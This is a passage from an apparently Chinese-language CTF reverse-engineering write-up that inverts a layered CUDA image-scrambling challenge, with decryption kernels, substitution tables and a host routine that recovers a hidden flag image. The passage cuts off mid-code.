class="number">4</span>);</span><br><span class="line">        <span class="type">uint32_t</span> sum = <span class="number">1786956040</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3238567</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 += ((v0 &lt;&lt; <span class="number">4</span>) + <span class="number">1386807340</span>) ^ ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2007053320</span>) ^ (v0 + sum);</span><br><span class="line">            v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + <span class="number">621668851</span>) ^ ((v1 &gt;&gt; <span class="number">5</span>) - <span class="number">862448841</span>) ^ (v1 + sum);</span><br><span class="line">            sum += <span class="number">-1708609273</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex) = v0;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>) = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= bid &amp; tid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> tmp = cuda_sbox[tid];</span><br><span class="line">    <span class="type">uint16_t</span> v = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v += cuda_tbox[tmp &amp; <span class="number">0xff</span>] * Input[bid * bdim + i];</span><br><span class="line">        tmp = tmp * <span class="number">5</span> + <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &lt; <span class="number">4137823</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> tmp1 = (v &lt;&lt; <span class="number">3</span>) | ((v &amp; <span class="number">224</span>) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        <span class="type">int</span> tmp2 = tmp1 * <span class="number">13</span> + (tid ^ bid);</span><br><span class="line">        v = cuda_sbox[(cuda_tbox[i &amp; <span class="number">0xff</span>] ^ tmp2) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = (<span class="type">uint8_t</span>)v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写出Layer3和Layer2的解密函数，Layer1是运动模糊卷积算法，不可逆，只能最后用算法还原清晰点。</p><p>Layer3这边倒数第二个那个256的循环是在python用z3解，其余部分都直接用cuda代码解密即可。</p><p>底下用到的cuda_invsbox是sbox算出的逆sbox数据。</p><p>cuda解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">__constant__ <span class="type">uint8_t</span> cuda_sbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_tbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_invsbox[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> oTid = cuda_invsbox[bid];</span><br><span class="line">    <span class="type">int</span> oBid = cuda_invsbox[tid];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Value = Input[bid * bdim + tid];</span><br><span class="line"></span><br><span class="line">    Output[oBid * bdim + oTid] = Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer3_part1</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xC5为13的逆元</span></span><br><span class="line">    <span class="type">uint8_t</span> inv_13 = <span class="number">0xC5</span>;</span><br><span class="line">    <span class="type">uint16_t</span> v = Input[CurIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4137823</span> - <span class="number">1</span>; i &gt;= <span class="number">8</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        v = cuda_invsbox[v &amp; <span class="number">0xff</span>];</span><br><span class="line">        <span class="type">int</span> tmp2 = v ^ cuda_tbox[i &amp; <span class="number">0xff</span>];</span><br><span class="line">        <span class="type">int</span> tmp1 = ((tmp2 - (tid ^ bid)) * inv_13) &amp; <span class="number">0xff</span>;</span><br><span class="line">        v = (tmp1 &gt;&gt; <span class="number">3</span>) | (tmp1 &lt;&lt; <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = v &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer3_part2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= bid &amp; tid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((CurIndex &amp; <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = *(<span class="type">uint32_t</span>*)(Input + CurIndex);</span><br><span class="line">        <span class="type">uint32_t</span> v1 = *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>);</span><br><span class="line">        <span class="type">uint32_t</span> sum = <span class="number">1786956040</span> + (<span class="number">-1708609273</span>) * <span class="number">3238567</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3238567</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum -= <span class="number">-1708609273</span>;</span><br><span class="line">            v0 += ((v1 &lt;&lt; <span class="number">4</span>) + <span class="number">621668851</span>) ^ ((v1 &gt;&gt; <span class="number">5</span>) - <span class="number">862448841</span>) ^ (v1 + sum);</span><br><span class="line">            v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + <span class="number">1386807340</span>) ^ ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2007053320</span>) ^ (v0 + sum);</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex) = v0;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>) = v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= tid | bid;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = Input[CurIndex];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层Layer3解密代码调用部分，只先解密最后那个大循环，然后256循环部分转到python进行z3求解。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>,</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">    <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>,</span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>,</span><br><span class="line">    <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tbox[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x7C</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0xF2</span>, <span class="number">0x6A</span>, <span class="number">0x6E</span>, <span class="number">0xC4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x2A</span>, <span class="number">0xFE</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0x76</span>, <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC8</span>, <span class="number">0x7C</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x58</span>, <span class="number">0x46</span>, <span class="number">0xF0</span>, <span class="number">0xAC</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAE</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xC0</span>, <span class="number">0xB6</span>, <span class="number">0xFC</span>, <span class="number">0x92</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3E</span>, <span class="number">0xF6</span>, <span class="number">0xCC</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xA4</span>, <span class="number">0xE4</span>, <span class="number">0xF0</span>, <span class="number">0x70</span>, <span class="number">0xD8</span>, <span class="number">0x30</span>, <span class="number">0x14</span>, <span class="number">0x04</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xC2</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0x06</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0x26</span>, <span class="number">0xB2</span>, <span class="number">0x74</span>, <span class="number">0x08</span>, <span class="number">0x82</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0x6E</span>,</span><br><span class="line">    <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3A</span>, <span class="number">0xD6</span>, <span class="number">0xB2</span>, <span class="number">0x28</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0xD0</span>, <span class="number">0x00</span>, <span class="number">0xEC</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB0</span>, <span class="number">0x5A</span>, <span class="number">0x6A</span>, <span class="number">0xCA</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x38</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xEE</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x4C</span>, <span class="number">0x32</span>, <span class="number">0x84</span>, <span class="number">0x44</span>, <span class="number">0xF8</span>, <span class="number">0x02</span>, <span class="number">0x7E</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x50</span>, <span class="number">0xA2</span>, <span class="number">0x40</span>, <span class="number">0x8E</span>, <span class="number">0x92</span>, <span class="number">0x9C</span>, <span class="number">0x38</span>, <span class="number">0xF4</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0xFE</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xCC</span>, <span class="number">0x0C</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0xEC</span>, <span class="number">0x5E</span>, <span class="number">0x96</span>, <span class="number">0x44</span>, <span class="number">0x16</span>, <span class="number">0xC4</span>, <span class="number">0xA6</span>, <span class="number">0x7E</span>, <span class="number">0x3C</span>,</span><br><span class="line">    <span class="number">0x64</span>, <span class="number">0x5C</span>, <span class="number">0x18</span>, <span class="number">0x72</span>, <span class="number">0x60</span>, <span class="number">0x80</span>, <span class="number">0x4E</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0A</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x48</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD2</span>,</span><br><span class="line">    <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x90</span>, <span class="number">0x94</span>, <span class="number">0xE4</span>, <span class="number">0x78</span>, <span class="number">0xE6</span>, <span class="number">0xC8</span>, <span class="number">0x36</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xD4</span>, <span class="number">0x4E</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0x08</span>, <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>,</span><br><span class="line">    <span class="number">0xE8</span>, <span class="number">0xDC</span>, <span class="number">0x74</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0xBC</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x70</span>, <span class="number">0x3E</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x60</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0xB8</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x9E</span>, <span class="number">0xE0</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x10</span>, <span class="number">0x68</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9A</span>, <span class="number">0x1E</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0xCE</span>, <span class="number">0x54</span>, <span class="number">0x28</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0xA0</span>, <span class="number">0x88</span>, <span class="number">0x0C</span>, <span class="number">0xBE</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x40</span>, <span class="number">0x98</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x0E</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBA</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        invSbox[sbox[i]] = i;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* Input = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">256</span> * <span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">readFile</span>(<span class="string">&quot;deep_flag.bmp&quot;</span>, Input, <span class="number">14</span> + <span class="number">40</span> + <span class="number">1024</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_sbox, sbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_tbox, tbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpyToSymbol</span>(cuda_invsbox, invSbox, <span class="number">256</span>, <span class="number">0</span>, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="type">uint8_t</span>* InPtr&#123;&#125;, * OutPtr&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;InPtr, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>(&amp;OutPtr, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(InPtr, Input, <span class="number">0x10000</span>, cudaMemcpyHostToDevice);</span><br><span class="line"></span><br><span class="line">    <span class="function">dim3 <span class="title">Blocks</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span>, <span class="title">Threads</span><span class="params">(<span class="number">256</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    Re_Layer3_part1 &lt;&lt; &lt;Blocks, Threads &gt;&gt; &gt; (InPtr, OutPtr);</span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>(Input, OutPtr, <span class="number">0x10000</span>, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">writeToFile</span>(<span class="string">&quot;Steg2&quot;</span>, Input, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cudaFree</span>(InPtr);</span><br><span class="line">    <span class="built_in">cudaFree</span>(OutPtr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>[] Input;</span><br><span 